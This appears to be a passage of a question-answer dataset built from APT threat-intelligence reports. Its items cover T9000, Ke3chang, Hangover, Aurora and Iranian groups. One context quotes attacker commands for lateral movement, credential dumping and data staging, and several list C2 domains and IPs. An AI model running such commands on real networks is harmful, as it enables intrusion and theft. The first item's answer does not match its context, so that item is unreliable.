herein.\nBig Headline: Targeted Exploitation #12: T9000 Malware; Tibet House Lure\nThis malware originates on December 31, 2015 and used the original filename \"[tibethouse] Upcoming Program Announcement\t\n \u00a0Last\t\n \u00a0Week of December.doc\". This timing and naming scheme is consistent\t\n \u00a0with the Tibetan-\u00ad\u2010themed engagement\t\n \u00a0seen in late December of 2015. The malware was first\t\n \u00a0submitted to Virus Total from India, and exploits CVE-\u00ad\u20102012-\u00ad\u20100158,\t\n \u00a0CVE-\u00ad\u20102012-\u00ad\u20101856, and CVE-\u00ad\u20102016-\u00ad\u20101641.\nThe bait\t\n  file is a\t\n  seven page \"Upcoming Programme Announcement\" apparently written by the Tibet\t\n  House. Document\t\n  metadata\t\n  shows the user name \"HighSea\" (previously observed in Targeted Exploitation #8 herein):\nThe \"Related People\" values inside these documents may be related to threat\t\n \u00a0actors, or threat\t\n \u00a0actor infrastructure. There is not\t\n \u00a0enough information to determine if these names are simply generated programmatically or if they actually represent\t\n \u00a0real people. In any event, the names have been re-\u00ad\u2010used\t\n \u00a0in\t\n \u00a0some cases and may be a\t\n \u00a0useful indicator of a\t\n \u00a0maliciously crafted document.\nThe malware at\t\n  play here is T9000, displaying all of the usual expected T9000 files including the Elevate.DLL file discussed earlier in this report. The malware binary itself is identical to an aforementioned T9000 sample (Sixteen Drops of Kadam Empowerment: T9000 Keylogger) and therefore the C2 is also identical to what\t\n  was reported earlier.\nAnswer this question: How does the LURK0 variant of Gh0stRAT initiate communication with its Command and Control (C2) server, and what are the key indicators that can be used to detect this activity?",
    "output": "The LURK0 variant of Gh0stRAT initiates communication with its C2 server by performing a DNS query for the domain 'manhaton.123nat[.]com', which resolves to the IP address 122.10.112[.]126. The C2 port used is TCP/8030. Key indicators for detecting this activity include the presence of the 'LURK0' string at the start of network packets and specific network-based alerts such as '[2016922] ET TROJAN Backdoor family PCRat/Gh0st CnC traffic', '[2021716] ET TROJAN Backdoor family PCRat/Gh0st CnC traffic (OUTBOUND)', and '[2808814] ETPRO TROJAN Backdoor family PCRat/Gh0st CnC Response'. These alerts can notify organizations of Gh0stRAT LURK0 variant traffic.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: BMW\n\u2022 mail.yahoo.sendsmtp.com\n\u2022 update.msntoole.com\nMyWeb\n\u2022 expo2010.zyns.com\n\u2022 win7.sixth.biz\n\u2022 ensun.dyndns.org\n\u2022 www.spaces.ddns.us\n\u2022 blog.strancorproduct.info5\n5 The sample was not located for this CnC; however, the callback and response captured by JsUnpack is consistent with the \"Eourdegh\" variant of the MyWeb malware, as outlined here: http://jsunpack.jeek.org/dec/go?report=e5f9dae61673a75db6dcb2475cb6ea8f22f66e9a\nWe have mapped out the relationship between the CnC servers for all three malware families and have found that they have shared common historical IP addresses in the past.\nUsing the IP addresses from the 23 CnC servers FireEye collected from our initial samples, we then mapped all the IP addresses that these domains resolved to. We then collected any other domains that also resolved to these IP addresses, resulting in at least 99 possible Ke3chang CnC servers.\nUpon further analysis, we find that these 99 CnC servers are primarily located in the U.S., China, and Hong Kong.\nMedium Headline: Information gathering / lateral movement analysis\nOnce a compromised system connects to the CnC server, the Ke3chang attackers follow a predetermined script. They first gather information about the local computer and the network to which it is connected. FireEye found the following tools on the CnC server, which the attackers used to steal logon credentials and move laterally across the network:\n\u2022 a7b20fe0bc6ae7f7a24670a732d2a021 gs.exe\ngsecdump v0.7 by [REDACTED] ([REDACTED]@truesec.se)\n\u2022 291503be3c25e52382f2a54420d03d71 gsl.exe gsecdump v0.6 by [REDACTED] ([REDACTED]@truesec.se)\n\u2022 8cdc9ffadbe4aad9418580b6ba2cc252 nete.exe\nNetE v1.0 Questions, comments, bitches and bugs to [REDACTED]@cultdeadcow.com\n\u2022 8cf6e698ecf3e167321a3ed2b9a9c62f PwDul2.exe 8cf6e698ecf3e167321a3ed2b9a9c62f PwDump62.l.exe\nUsage: PwDul2.exe [-x][-n][-h][-o output_file][-u user] [-p password][-s share] machineName\nAfter running the standard commands available in the AutoScanner, the attackers often used the \"net group\" command to acquire information about specific network groups revealed in the pre-configured commands. This step was done manually; we found several instances of typing errors, such as the following:\n\u2022 net group \"[REDACTED]\" /doamin\n\u2022 net group /doamin\nThe attackers then listed information for specific users, focusing on users and groups suspected of possessing advanced rights such as domain administrators and service accounts that have access to a wide range of systems.\nThen they used the \"net use\" command to map network drives, including some that required a password, as follows:\n\u2022 net use \\\\[REDACTED] [REDACTED]:J: /user:[REDACTED]\nIn some cases, they appeared to try and move laterally by copying a file (always initially called \"msn.tmp\") to other machines on the network. They frequently changed the destination directory and filename of the target file, presumably to make finding the malware more difficult for incident responders upon initial discovery.\n\u2022 net use \\\\172.xx.xx.x [REDACTED] /u:172.xx.xx.x\\[REDACTED]\n\u2022 dir \\\\172.xx.xx.x\\c$\n\u2022 dir \"\\\\172.xx.xx.x\\c$\\Program Files\\Adobe\"\n\u2022 copy C:\\Users\\[REDACTED]\\AppData\\Local\\Microsoft\\Windows\\msm.tmp \"\\\\172.xx.xx.x\\c$\\Program Files\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe\" /y\nThe attackers then deleted the network shares:\n\u2022 net use \\\\[REDACTED] /del\nAfter that, attackers gathered specific data of interest (such as the listings of all files in certain directories), and compressed it all within the RAR archive as follows:\n\u2022 %temp%/wmp32.dll a -m5 \u2013hp[REDACTED] %temp%/tem.rar %temp%\\*dir*.*\nThey then checked the RAR archive, uploaded it to the CnC server, and deleted the archive from the compromised system:\n\u2022 dir %temp%/tem.rar\n\u2022 del C:\\DOCUME~1\\[REDACTED]\\[REDACTED]\\Temp\\tem.rar\nDuring our window of visibility, FireEye found evidence that the attackers were able to enumerate the various target networks, move laterally to compromise new systems, and finally to gather information that was compressed and uploaded to the CnC server. However, FireEye lost visibility on this Ke3chang CnC server before the attackers shifted to the major data exfiltration phase.\n\nQuestion: How did the Ke3chang attackers gather information about the local computer and the network to which it was connected after compromising a system? What tools and techniques did they employ for lateral movement and credential theft?\n\nAnswer:",
    "output": "Once a compromised system connected to the CnC server, the Ke3chang attackers followed a predetermined script to gather information about the local computer and the network. They used several tools to steal logon credentials and move laterally across the network. These tools included 'gs.exe' and 'gsl.exe', which are versions of gsecdump, 'nete.exe' (NetE v1.0), and 'PwDul2.exe' (PwDump62.l.exe). The attackers ran standard commands available in the AutoScanner and manually used the 'net group' command to acquire information about specific network groups. They listed information for specific users, focusing on those with advanced rights like domain administrators and service accounts. To move laterally, they used the 'net use' command to map network drives and copied a file (initially called 'msn.tmp') to other machines on the network, changing the destination directory and filename to evade detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Target selection\nWe have direct knowledge of only one attack \u2013 the one against Telenor. During this investigation we have obtained malware samples and decoy documents that have provided indications as to whom else would be in the target groups. We have observed the usage of peculiar domain names that are remarkably similar to existing legitimate domains. We have also obtained sinkhole data for a number of domains in question and found open folders with stolen userdata in them; enough to identify targets down to IP and machine name/domain level. This showed a geographical distribution where Pakistan was the most affected in volume, but also showed a multitude of other countries being represented.\nNote that these data should be taken as indicative only. IP counts are misleading for many reasons. One machine can generate many IP addresses, and some IP addresses are probably lab machines. However, the indication that Pakistan is the most prevalent target seems solid.\nIn the following pages we've highlighted some of the files we have seen used to attack organizations in different countries. As can be seen from the examples the attackers have gone to great lengths to make the social engineering aspect as credible and applicable as possible.\nMedium Headline: Pakistan\nThe most obvious target seems to be Pakistan. As is visible above, computers in Pakistan are by far the most active in connecting to malicious domains.\nWe found logs in the open drop folders that contained suggestive data, such as this snippet from a 2012 log entry (subdomain redacted):\nSinkhole-logged HTTP requests are also informative, such as this seemingly from a Pakistani embassy: \"GET /sdata/shopx.php?fol=EMBASSYOFPAKIST-Embassy%20of%20Pakistan.....\"\nDecoy files tailored towards Pakistan revolve around the ongoing conflicts in the region, regional culture and religious matters.\nPakistani soldiers praying in Karakoram. Apparent source: http://photography.nationalgeographic.com/photography/enlarge/praying-soldiers_pod_image.html\nGoogle images of the Mendhar region in India. There was a border clash there recently.\nA review of Indian future weapon acquisitions.It seems to be sourced from defence.pk\nAdditional examples can be found in Appendix B.\nMedium Headline: China\nChina is another country which apparently has been targeted to some extent.\nFor example, we found a data dump and keylog seemingly harvested from a computer belonging to a Chinese academic institution. This dump was generated in July 2012 and contains Word documents, PowerPoint presentations and images.\nUploaded archives of harvested data.\nDecoys are also present, but not in the amount as is seen against Pakistani targets.\nChinese decoy, a scanned document named court_order.jpg. This is a notification to the family of a criminal about his jail sentence. Language is simplified Chinese; likely mainland China.\nMedium Headline: The Khalistan movement\nThis is a political secessionist movement aiming to create a sovereign Sikh nation in the region of Punjab in India. Violent episodes between supporters of the Khalistan movement and government forces have occurred through history since the movement's creation in 1971.\nExamples of malware apparently aimed at the movement are md5's a4a2019717ce5a7d7daec8f2e1cb29f8 and f70a54aacde816cb9e9db9e9263db4aa. The former appears to be this file: http://f00dlover.info/Khalistan/Victims_want_Sajjan_Kumar_punished.doc.zip\nIt is interesting to note that f00dlover.info has historically shared the IP address 173.236.24.254 with many other domains belonging to this infrastructure \u2013 for example the domain researcherzone.net which was used in the Telenor intrusion. There are also a number of domains with active web pages that used to exist on this IP; for example khalistancalling.com. Khalistancalling.com has since moved on to another bad IP (46.182.104.83) and must be considered owned by the attackers.\nMedium Headline: The Nagaland movement\nThe Nagaland (or Nagalim) movement is another secessionist group aiming to create a sovereign homeland for the Naga people living in North-Eastern India and North-Western Burma. We have seen at least two attacks apparently aimed at them.\nA sample from 2010, md5 168f2c46e15c9ce0ba6e698a34a6769e, showed a scanned document which appears to be a letter from the \"President of Nagalim\".\nThe malware sample also installed an executable which in turn connected back to the domain zeusagency.org on the IP 176.31.65.124. Zeusagency.org has hosted different malware; one (3105b020e2bd43924404bc4e3940191b) connected to fistoffury.net on the IP 176.31.65.126.\nThe IP range 176.31.65.124 - 176.31.65.127 contains a series of domains used by Gimwlog and Auspo malwares. These are somewhat different from the standard Hanove series, though functionality is roughly equivalent.\nAnother malicious installer (md5 f1799d11b34685aa209171b0a4b89d06) contained the following decoy:\nThe malware included connects to the domain global-blog.net.\n\nBased on the above text, answer a question. What evidence suggests that China was targeted by the APT, and how did the attackers tailor their approach for Chinese targets compared to Pakistani ones?",
    "output": "Evidence of China being targeted includes the discovery of a data dump and keylog harvested from a computer belonging to a Chinese academic institution. This dump, generated in July 2012, contained Word documents, PowerPoint presentations, and images. The attackers also used decoys, although not as extensively as with Pakistani targets. An example of a Chinese decoy is a scanned document named 'court_order.jpg,' which was a notification to the family of a criminal about his jail sentence, written in simplified Chinese, indicating mainland China as the target. The difference in approach suggests that while Pakistan was the primary target with a high volume of tailored decoys, the attackers also had an interest in Chinese targets but employed fewer resources in crafting specific decoys for them.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Longhorn: Tools used by cyberespionage group linked to Vault 7\nApril 9, 2017\nFirst evidence linking Vault 7 tools to known cyberattacks.\nBy: Symantec Employee\nCreated 10 Apr 2017\n: ,\nSpying tools and operational protocols detailed in the recent Vault 7 leak have been used in cyberattacks against at least 40 targets in 16 different countries by a group Symantec calls Longhorn. Symantec has been protecting its customers from Longhorn's tools for the past three years and has continued to track the group in order to learn more about its tools, tactics, and procedures.\nThe tools used by Longhorn closely follow development timelines and technical specifications laid out in documents disclosed by WikiLeaks. The Longhorn group shares some of the same cryptographic protocols specified in the Vault 7 documents, in addition to following leaked guidelines on tactics to avoid detection. Given the close similarities between the tools and techniques, there can be little doubt that Longhorn's activities and the Vault 7 documents are the work of the same group.\nQuestion: How does the Longhorn group's use of cryptographic protocols and tactics align with those detailed in the Vault 7 documents? What implications does this alignment have for attributing the group's activities to the same entity responsible for the Vault 7 leaks?",
    "output": "Answer: The Longhorn group's use of cryptographic protocols and tactics closely follows the development timelines and technical specifications outlined in the Vault 7 documents. This includes sharing the same cryptographic protocols and adhering to leaked guidelines aimed at avoiding detection. The strong similarities between the tools and techniques used by Longhorn and those described in the Vault 7 documents suggest that both sets of activities are likely the work of the same group. This alignment provides compelling evidence for attributing the Longhorn group's activities to the entity responsible for the Vault 7 leaks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SK HACK\nOn 28\t July\t 2011 SK Communications announced\t it had\t been the subject\t of a hack which resulted in the theft\t of\t the personal details of up\t to 35\t million of\t its users.\t The compromised\t details were those of CyWorld and\t Nate users,\t as stored\t in SK Communications' user databases. CyWorld1 is\t South Korea's largest\t social networking\t site and\t Nate is\t a popular South\t Korean web portal.\t Both\t services are owned by\t SK Communications.\t (Sung\u00adjin, 2011)\n1CyWorld has\t also expanded to China, Japan, the United\t States, Taiwan, Vietnam and\t Europe. (SK\t Communications)\nThe sophistication of\t the attack along\t with\t the period of time over which\t it\t was planned,\t and\t conducted, indicate that\t this attack was likely\t to have been undertaken by an Advanced Persistent Threat2 .\nBetween 18 and 25 July 2011\t the attackers3 infected over 60 SK\t Communications computers and used them\t to gain access to the user databases.\t The attackers infected\t these computers by\t first compromising\t a server, belonging\t to a South Korean software company, used to deliver software updates to\t customers (including SK Communications).\t The attackers modified the server so\t that the SK Communications computers would receive a trojaned4 update file when they\t conducted\t their routine checks for software updates.\t (Moon\u00adyoung, 2011) (ESTsoft,\t 2011)\n2 For a definition of the term 'Advanced\t Persistent Threat'\t refer to the Command Five paper 'Advanced\t Persistent Threats: A Decade in Review'\t (Command\tFive Pty Ltd, 2011).\n3 The term 'attackers' is used in this\t paper to describe both the hackers and\t anyone to whom they were reporting.\n4 A trojan is a document or program which\t appears harmless\t but performs malicious activity when opened or run.\nSuch\t routine updates (commonly\t known as 'patches') are a good security\t practice as they often include fixes for security weaknesses identified in the software.\t Without software updates the SK Communications computers would\t have been vulnerable to several other attacks including\t a significant one which\t was made public in June 20115 .\t The security of software updates is usually trusted\t implicitly\t and\t the exploitation of\t this trust relationship could\t go\t undetected by many targets,\t as it\t did for some time by\tSK\t Communications.\nBetween 18\t and 25\t July\t the attackers conducted\t command and control and monitoring activities on the infected computers.\t This involved the upload\t of\t tools,\t conveniently stored on the website of a Taiwanese publishing company\t the attackers had earlier hacked.\t Then on 26 July\t 2011,\t the attackers,\t having\t done the necessary\t groundwork,\t proceeded to\t hack the Nate and CyWorld user databases6 . (Birdman, 2011) (Moon\u00adyoung,\t 2011)\nUsing\t 'waypoints'7 to\t obfuscate the source of\t their activities,\t the attackers successfully\t stole the personal details of up to\t 35 million SK Communications customers from the user databases.\t These personal details included\t names,\t phone numbers,\t home and email addresses, birth dates, gender details,\t user identifiers,\t passwords and,\t due to\t South Korea's Real Name System8 which\t was in place at\t the time, also\t resident\t registration numbers.\t The passwords and resident\t registration numbers were reportedly encrypted but the other details were not.\t (Birdman,\t 2011) (Hauri \u00adResponse Team, 2011) (Moon\u00adyoung, 2011) (Jin\u00adwoo\t Seo,\t 2011)\nBig Headline: THE UPDATE SERVER\nThe update server used\t by the attackers as a launchpad\t for their attack against SK\t Communications was ESTsoft's ALZip update server. ESTsoft is\t a large South\t Korean software company\nand\t ALZip is a file compression and\t archive tool developed\t by\t the company.\t ALZip\t is\t part of a trusted suite of tools known as ALTools which also includes the antivirus software,\t ALYac.\t The antivirus software is\t independent of the rest of\t the suite of\t tools.\t It\t uses a different update program\t and\t server to\t the other tools.\t The security\t of ALYac was not compromised in the attack.\t (ESTsoft, 2011) (ESTsoft,\t 2011)\n5 A vulnerability exists\t in certain versions of a software program used by SK\t Communications\t (amongst other companies) which could allow an attacker to gain control of computers\t if the program is\t used\t on them to open a maliciously crafted\t file. (Japanese IT Promotion Agency 2011)\n6 According\t to the Korean National Police Agency the hacker collected information from the infected\t computers\t for up to a week before hacking\t the databases. (Moon\u00adyoung, 2011)\n7 A 'waypoint'\t is\t a computer used\t by attackers\t as\t an intermediary point to obfuscate the source of their hacking\tactivities.\n8 Under South Korea's Real\t Name System, Koreans\t were required to submit their real\t names and\t resident registration numbers when creating\t accounts\t on any website attracting more than 100,000 visitors\t per day. (TMCnews\t 2011)\nThe attackers,\t purportedly using\t Chinese IP\t addresses9 ,\t gained\t access to the ALZip update server via unknown means and\t uploaded instructions to it.\t Then, when SK\t Communications computers conducted their routine check for ALTools updates, the attacker's instructions on the update server directed the computers to download a trojaned update from\t the attacker's Content Delivery Network10 (CDN) instead of\t the legitimate update from ESTsoft's CDN. (ESTsoft,\t 2011)\nThe trojaned\t update exploits a software vulnerability 11 in the ALTools Common Module Update Application (ALCMUpdate.exe) \u00adthe program used to conduct the routine checks for ALTools software updates.\t This vulnerability\t allowed\t a malicious Dynamic Link Library\t (DLL)12 file to be loaded\t instead of the legitimate DLL update file (ALAd.dll),\t thereby enabling malicious code to be run and\t malicious software (malware) to\t be installed\t on computers which\t requested\t the update.\t Over 60\t SK Communications computers were compromised via the trojaned\t update. (ESTsoft, 2011) (EDaily,\t2011) (ESTsoft,\t 2011)\nThe attackers are believed to have designated\t targets for infection, so that\t the trojaned\t update was only\t delivered\t to SK Communications computers and\t not to\t other computers requesting\t the same\nsoftware update from\t the server13 .\t The way\t the update server was used\t in the attack is\t depicted in Figure 1.\n9 According\t to South\t Korean news\t outlets\t the attackers\t used Chinese IP\t addresses. (Goodin, 2011)\n10 A CDN is comprised\t of multiple servers\t which\t are used to distribute software downloads, thereby balancing\t the load\t and preventing outages\t due to individual\t servers becoming overloaded.\n11 A software vulnerability existed in the update program used\t by several\t tools in the ALTools suite. The vulnerability allowed arbitrary code to be executed but could only\t be exploited from the actual update server or, if a computer could be directed to it (eg. by modifying\t the host file\t on the computer or via DNS hijacking), a fake\t update server. A patch\t for the vulnerability was\t released on 4\tAugust 2011. (ESTsoft 2011) (ESTsoft, 2011)\n12 According\tto Microsoft, a DLL is a library that contains code and data that can be used by more than one program at the same time. (Microsoft 2007)\n1. Attacker modifies the ALZip update server.\n2. Computers check for ALZip software updates and are redirected to a Content Delivery Network (CDN).\n3. Non\u00adtargeted computers download a legitimate update from the ESTsoft CDN. Targeted computers download a trojaned update from the attacker's malicious CDN.\nFIGURE 1 \u00adDEPICTION OF HOW THE ALZIP UPDATE SERVER WAS USED IN THE ATTACK\nThis\t specific targeting\t of SK Communications indicates the targeting wasn't purely opportunistic. To target\t the company in the manner they\t did,\t the attackers would have needed\t knowledge of SK\t Communications and\t its\t use of\t ALZip,\t ahead\t of the\nattack.\t This\t knowledge was likely\t gained during the reconnaissance14 stage of\t the attack.\n13 The Korean National\t Police Agency presumes\t the hacker, instead\t of targeting\t all ALZip users, singled out the intranet computers\t at SK\t Communications. (Moon\u00adyoung,\t 2011)\nQ: What role did the ALZip update server play in the attack against SK Communications, and how was it compromised?",
    "output": "The ALZip update server played a crucial role as the launchpad for the attack against SK Communications. The attackers gained access to the server via unknown means and uploaded instructions to it. When SK Communications computers conducted their routine check for ALTools updates, the attacker's instructions on the update server directed the computers to download a trojaned update from the attacker's Content Delivery Network (CDN) instead of the legitimate update from ESTsoft's CDN. This allowed the attackers to install malicious software on the targeted computers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Describe the process by which Trojan.Loader.891 modifies the process memory to move to its main malicious functionality. What specific techniques does it employ to locate necessary functions?",
    "output": "Trojan.Loader.891 modifies the process memory to transition to its main malicious functionality by altering the instruction following the download of the malicious library. It locates the necessary functions by hashing their names and comparing them with the desired hash values. Library names are hashed as Unicode strings converted to upper case, while function names are hashed as ASCII strings without changing the case. The resulting two hashes are added together and then compared with the desired one. This method allows the trojan to dynamically find and utilize the required functions without hardcoding their names, making it harder to detect through static analysis.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: COMMAND AND CONTROL\nThe payload communicates with its command and control server over port 443. The source port is randomly selected. While outbound traffic appears to be HTTPS, the actual traffic uses a weak custom encryption scheme. The command and control packets have a very specific formativ .\nThe payload section is encrypted with a key selected by using GetTickCount. This means each infected node has its own key. The key is embedded in the header of the packet, and is easily recovered.\nMedium Headline: HOW THE MALWARE WORKS\nThe primary control logic can be found in the module registered under the service key (rasmon.dll, etc.). This module has been written in c and includes several specific methods and encodings that provide forensic track+ability.\nThe above screenshot illustrates a REcon(tm) trace on the malware dropper and subsequent service creation. Location A. represents the dropper program, which unpacks itself and decompresses a file to the system32 directory. Point B. represents the initial svchost.exe startup, which is loading the malware payload. Location C. is the actual execution of the malware service, which remains persistent. At points E. and F. you can see the malware checking in with the command and control server. Finally, location D. represents the dissolvable batch file which deletes the initial dropper and then itself.\nFIGURE 1 - BASE64 AND XOR ENCRYPTION SCHEME\nFIGURE 2 -C&CCOMMAND PARSER\nMedium Headline: Digital DNA Sequence for Aurora Malware\nTo thwart command and control and prevent data loss, known C&C domains should be blocked at the egress firewall. The domains listed in the Detect section represent a significant set of those currently known to be operating. IDS signatures similar to the one illustrated in the Detect section should be used to detect inbound exploit attempts, and machines accepting this data should be scanned for potential infections. Many A/V products now contain signatures for the Aurora exploit and will be effective in detection and removal. However, the attackers that represent the threat will not be deterred, and variants of the attack are nearly assured.\nAnswer this question: How does the Aurora malware communicate with its command and control server, and what are the implications of its encryption scheme?",
    "output": "The Aurora malware communicates with its command and control server over port 443, which is typically used for HTTPS traffic. However, the actual traffic uses a weak custom encryption scheme, making it appear as HTTPS but not providing the same level of security. The payload section is encrypted with a key selected using GetTickCount, meaning each infected node has its own unique key. This key is embedded in the header of the packet and can be easily recovered. The implications of this encryption scheme are significant. Firstly, the use of a weak custom encryption scheme means that the communication can potentially be intercepted and decrypted more easily than if standard HTTPS encryption were used. Secondly, the unique key per infected node complicates forensic analysis but also provides an opportunity for defenders to recover the key and potentially decrypt the communications.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Chapter 1: About This Document\nThis report is classified TLP: Amber.\nThe Traffic Light Protocol (TLP) was created in order to facilitate greater sharing of information. TLP is a set of designations used to ensure that sensitive information is shared with the appropriate audience.\n\uf06e TLP:Red: Recipients may not share TLP:RED information with any parties outside of the specific exchange, meeting, or conversation in which it was originally disclosed.\n\uf06e TLP:Amber: Recipients may only share TLP:AMBER information with members of their own organization, and with clients or customers who need to know the information to protect themselves or prevent further harm.\n\uf06e TLP:Green: Recipients may share TLP:GREEN information with peers and partner organizations within their sector or community, but not via publicly accessible channels.\n\uf06e TLP:White: Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction.\nFor additional information on the TLP, see http://www.us-cert.gov/tlp.\nMedium Headline: 2.1  Iranian Cyber Ecosystem\nThe Iranian cyber ecosystem is decentralized and fluid, with individual threat actors moving between cyber espionage groups and even undertaking cyber crime activity. Attacks are not infrequently outsourced to individual external contractors working within small corporate consultancies. This structure makes it difficult for researchers to definitively group threat actors and can offer the Iranian government plausible deniability for destructive attacks. In several cases, Symantec has seen threat actor groups share tools, infrastructure, targets, and tactics.\nThe tactics of Iranian threat actors have evolved from quick and relatively simple destructive attacks, such as distributed denial of service (DDoS) attacks or website defacements, to an increased focus on network compromises where the actors maintain a persistent foothold and obfuscate their presence to make attribution difficult. Iranian groups have increasingly targeted critical infrastructure including energy and telecommunications companies.\nIranian threat groups have also been tied to multiple destructive wiper attacks. Identifying potential targets for destructive attacks is particularly problematic because a change from espionage to destruction comes with limited warning if a threat group is already present on a network, as seen with Timberworm and Greenbug espionage operations facilitating the Shamoon destructive attacks beginning in late 2016.\nMedium Headline: 2.2  Key Observations\nConsidering the multitude of disparate groups operating and conducting cyber attacks against organizations around the globe, there is not a single trait that defines them. The following are some key observations from tracking these groups:\n\uf06e During recent years, actor groups operating out of Iran have honed their skills at an unprecedented scale, being able to victimize Fortune 500 organizations along with their public sector counterparts.\n\uf06e The groups appear to be unconcerned with attacks being publicly attributed to them.\n\uf06e Aside from Greenbug and Shamoon having worked together, most of the different groups seldom work in tandem; they seem to mostly be independent of each other, working under organizational mandates which do not often intersect.\n\uf06e In the early years, the groups appeared motivated to conduct DDoS attacks against financial institutions, with the aim of attempting heists, but those attacks have not been seen for several years.\n\uf06e Groups such as Elfin, Crambus, Seedworm, Chafer, Tortoiseshell, and others are motivated to conduct espionage by attacking:\n\u2013 Private sector: Telecommunication providers, transportation (air and marine) entities, defense contractors, oil and natural gas companies, and those in their supply chain.\n\u2013 Public sector: Military intelligence, diplomatic missions, think tanks, and defense ministries.\n\uf06e Some of the groups have no reservations in conducting destructive attacks, rendering computing equipment unusable.\n\uf06e Several groups make extensive use of dynamic DNS services while conducting attack campaigns.\n\uf06e At least two of the groups have shown a proclivity towards using DNS as a communication channel between victimized computers and the malware's control infrastructure, that is DNS tunneling. This functionality has been observed across both IPv4 and IPv6.\n\uf06e The two most widely used methods of infiltrating a target's network remain:\n\u2013 Spear phishing using topical themes with embedded scripts that invoke PowerShell to download additional components.\n\u2013 Publicly documented vulnerabilities such as those in VPN and web servers.\n\uf06e All groups rely on public or open-source tools (Mimikatz, LaZagne, and so on) to conduct their campaigns; the only differing factor amongst the groups is the degree of reliance.\n\uf06e There appear to be several hacktivists that conduct uncoordinated attacks, like site defacements, as a sign of patriotism. These are unpredictable and opportunistic, so details have been left out of this document.\nMedium Headline: 2.3  Outlook\nGiven the history of attacks originating from Iran, it is evident the groups consider destruction of equipment as an acceptable form of damage to targets. However, to date these incidents have only targeted Middle Eastern entities. Iranian actors have not shown an appetite for conducting similar attacks against Western organizations. Considering the tense geopolitical climate in 2020 and based on previous Iranian activity, we believe cyber attacks originating from Iran or Iranian proxies would be (in order of descending probability):\n\uf06e Wipers being used for destructive attacks against critical infrastructure\n\uf06e Infrastructure for telecommunication providers being attacked to disrupt services\n\uf06e Hacktivist defacements of popular websites\n\uf06e DDoS attacks against financial entities\nTo date, most Iran originating actor groups, other than Greenbug and Shamoon, operated with only a small degree of collaboration. We suspect a coordinated attack campaign is more likely in 2020 but organizing such an attack is likely to take time.\nMedium Headline: 3.1  Shamoon\nShamoon has received a lot of public attention since it first appeared in August 2012 and used the malware family (<https://www.symantec.com/security_response/writeup.jsp?docid=2012-081608-0202-99>)W32.Disttrack in its attacks against two Middle Eastern oil and natural gas organizations. The attacks were destructive in nature, wiping out critical data from computers and rendering them unusable.\nThe malware used by this group leveraged a legitimate driver to wipe machines, and subsequently reported wiping statistics to a command and control (C&C) server.\nIn both attacks from 2012, and those subsequently seen towards the end of 2016, hard-coded network credentials were configured into the malware, which assisted its spreading across the network. These credentials (<https://www.symantec.com/connect/blogs/greenbug-cyberespionage-group-targeting-middle-east-possible-links-shamoon>)were acquired and likely (<https://www.symantec.com/connect/blogs/greenbug-cyberespionage-group-targeting-middle-east-possible-links-shamoon>)shared by Greenbug, allowing Shamoon the ability to execute its attack.\nTable 1:  Activity Timeline on Computer During 2016 Shamoon Attack\nCredentials were likely stolen a month prior to the attackers' return to use common legitimate tools to dump additional information from the victim network before deploying Disttrack.\nMedium Headline: 3.2  Dustman/ZeroCleare\nIn December 2019, IBM X-Force (<https://www.ibm.com/downloads/cas/OAJ4VZNJ>)publicly wrote about a wiper malware it came across and named ZeroCleare based on PDB strings within the malware. This malware is an evolution of Disttrack, used in the Shamoon incidents. The authors updated the malware logic but retained the underlying logic of utilizing the Eldos driver to overwrite the MBR and partitions. The attackers used a vulnerable VirtualBox driver to bypass security controls and eventually use the Eldos driver to gain direct access to the raw hard disk and conduct their wiping operation.\nSymantec automatically detected and blocked this piece of malware in July 2019, which appears closer to the date of compilation of the malware in June 2019.\nIn January 2020, the (<https://www.scribd.com/document/442225568/Saudi-Arabia-CNA-report>)National Cybersecurity Authority of Saudi Arabia released a report about a wiper malware they called Dustman based on the file name used during an attack campaign. Dustman is a further evolution of ZeroCleare, where the authors optimized functionality into a single file instead of the methods used in the June/July campaigns.\nSmall Headline: 3.3.1  Case Study 1\nIn June 2019, Elfin sent out a phishing email to hundreds of recipients across multiple countries in what could be deemed an opportunistic trawling attack. The link within the document led recipients to dynamic DNS infrastructure controlled by the attackers. (<>)Figure 1 is a screenshot of the email sent.\nFigure 1:  Screenshot of Email Sent by Elfin\nAs Symantec observed email activity across numerous sectors and regions, it appeared likely that Elfin was conducting a widespread email campaign with enticing lures to hook high-value targets at multiple organizations, rather than targeting specific industries.\n\nWhy is it challenging to identify potential targets for destructive attacks by Iranian threat groups, and what historical examples illustrate this challenge?",
    "output": "Identifying potential targets for destructive attacks by Iranian threat groups is challenging because a change from espionage to destruction can occur with limited warning if a threat group is already present on a network. Historical examples include the Timberworm and Greenbug espionage operations facilitating the Shamoon destructive attacks beginning in late 2016. These incidents highlight how espionage activities can transition to destructive attacks without much notice.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What types of information does the malware in Operation Beebus collect from a compromised machine, and how does it handle the downloading and execution of additional payloads?",
    "output": "The malware collects various types of information from the compromised machine, including the type of processor, CPU speed, product type (queried from the registry key \\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\ProductOptions\\\\ProductType), and memory usage. Additionally, it has modules to capture system information, process ID, process start time, and current user information. The malware also contains a module to download and execute additional payloads and updates. It downloads these payloads into the %TEMP% directory and invokes execution using the CreateProcessA function. The malware sends multiple GET requests and eventually starts a POST request a couple of hours after the initial check-in with the CnC server, leading to the download and execution of new executables in the TEMP directory.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
